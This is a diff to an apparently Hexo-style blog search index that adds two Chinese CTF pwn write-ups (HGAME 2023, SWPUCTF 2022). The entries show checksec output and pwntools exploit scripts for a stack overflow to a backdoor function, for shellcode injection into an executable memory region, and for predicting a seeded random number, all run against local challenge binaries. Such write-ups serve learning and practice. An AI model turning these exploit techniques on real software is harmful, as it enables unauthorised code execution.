@@ -747,13 +747,76 @@
       </tags>
   </entry>
   <entry>
+    <title>HGAME 2023</title>
+    <url>/posts/a642c320/</url>
+    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
+<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
+</div>
+
+<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>HGAME 2023</p>
+</div>
+
+<hr>
+<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-easy-overflow"><a href="#1-1-easy-overflow" class="headerlink" title="1.1 easy_overflow"></a>1.1 easy_overflow</h2><p>例行检查</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file vuln</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>64 位程序，未开启随机地址以及 Canary 保护，丢到 IDA 静态分析代码</p>
+<p><img src="/../../../image/20230925110348.png"></p>
+<p>第 5 行将输出流关闭了，第 6 行存在缓冲区溢出</p>
+<p><img src="/../../../image/20230925110413.png"></p>
+<p>存在后门函数 <code>b4ckd0or()</code>，编写 exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./vuln&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x10</span> + <span class="number">0x08</span>), rop.ret.address, elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>], <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0\n&#x27;</span>) <span class="comment"># 重定向输出流</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SWPUCTF 2022</title>
+    <url>/posts/d3c21ad1/</url>
+    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
+<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
+</div>
+
+<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>SWPUCTF 2022</p>
+</div>
+
+<hr>
+<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-shellcode？"><a href="#1-1-shellcode？" class="headerlink" title="1.1 shellcode？"></a>1.1 shellcode？</h2><p>检查文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ checksec --file pwn </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>丢到 IDA 静态分析代码</p>
+<p><img src="/../../../image/20230925105105.png"></p>
+<p>第二个 call 调用 <code>mmap(0x30303000, 0x1000, 7, 0x32, -1, 0)</code>  函数映射了一块从0x30303000 地址开始 0x1000 字节大小的可读、可写、可执行的内存块。</p>
+<p>第三个 call 调用 <code>read(0, 0x30303000, 0x64)</code> 函数从输入流中读取了 0x64 字节并存入 0x30303000 开头的地址块中</p>
+<p>第四个 call 将 0x30303000 内存块存储的内容作为函数调用</p>
+<p>如果向 0x30303000 写入一段 shellcode 即可执行并获得 shell，编写 exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-Darling"><a href="#1-2-Darling" class="headerlink" title="1.2 Darling"></a>1.2 Darling</h2><p>检查文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file Darling</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>64 位程序，保护全开，丢到 IDA 静态分析代码</p>
+<p><img src="/../../../image/20230925111700.png"></p>
+<p>计算随机数，编写脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./Darling&#x27;</span>])</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1317E53</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;for you.\n&#x27;</span>, <span class="built_in">str</span>(libc.rand() % <span class="number">100</span> - <span class="number">64</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NUSTCTF 2022</title>
     <url>/posts/e555e042/</url>
     <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
 <p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
 </div>
 
-<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>前言</p>
+<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>NUSTCTF 2022</p>
 </div>
 
 <hr>
